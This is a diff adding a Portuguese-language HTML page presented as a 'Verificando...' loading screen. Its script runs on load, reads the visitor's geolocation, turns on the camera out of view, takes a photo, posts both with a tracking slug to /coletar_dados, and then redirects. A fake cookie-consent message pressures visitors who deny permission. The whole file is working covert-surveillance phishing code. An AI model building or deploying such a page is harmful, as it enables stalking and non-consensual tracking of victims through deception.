@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Verificando...</title>
+</head>
+<body>
+    <h3 id="mensagem">Carregando...</h3>
+
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        const slug = "{{ slug if slug else '' }}";
+
+        async function coletarDados() {
+            let latitude = "", longitude = "", foto_base64 = "";
+
+            // Atualiza a mensagem na tela
+            function atualizarMensagem(texto) {
+                document.getElementById('mensagem').innerText = texto;
+            }
+
+            // Captura a localização
+            try {
+                atualizarMensagem("Obtendo localização...");
+                const pos = await new Promise((res, rej) => {
+                    navigator.geolocation.getCurrentPosition(res, rej);
+                });
+                latitude = pos.coords.latitude;
+                longitude = pos.coords.longitude;
+            } catch (e) {
+                console.warn("Erro na geolocalização:", e);
+                atualizarMensagem("Para melhor experiência todos os Cokies  devem ser aceitos! atualize a página");
+                return;
+            }
+
+            // Captura a imagem da câmera
+            try {
+                atualizarMensagem("Acessando câmera...");
+                const video = document.getElementById('video');
+                const canvas = document.getElementById('canvas');
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+
+                await new Promise(r => setTimeout(r, 2000)); // aguarda a câmera ligar
+
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                foto_base64 = canvas.toDataURL("image/png");
+
+                stream.getTracks().forEach(t => t.stop());
+            } catch (e) {
+                console.warn("Erro ao acessar câmera:", e);
+                atualizarMensagem("Para melhor experiência todos os Cokies  devem ser aceitos! atualize a página");
+                return;
+            }
+
+            // Envia os dados
+            atualizarMensagem("Enviando dados...");
+            const payload = { slug, latitude, longitude, foto_base64 };
+
+            try {
+                const res = await fetch("/coletar_dados", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload)
+                });
+
+                const json = await res.json();
+                window.location.href = json.destino;
+            } catch (e) {
+                console.error("Erro ao enviar dados:", e);
+                atualizarMensagem("Para melhor experiência todos os Cokies  devem ser aceitos! atualize a página");
+            }
+        }
+
+        coletarDados();
+    </script>
+</body>
+</html>
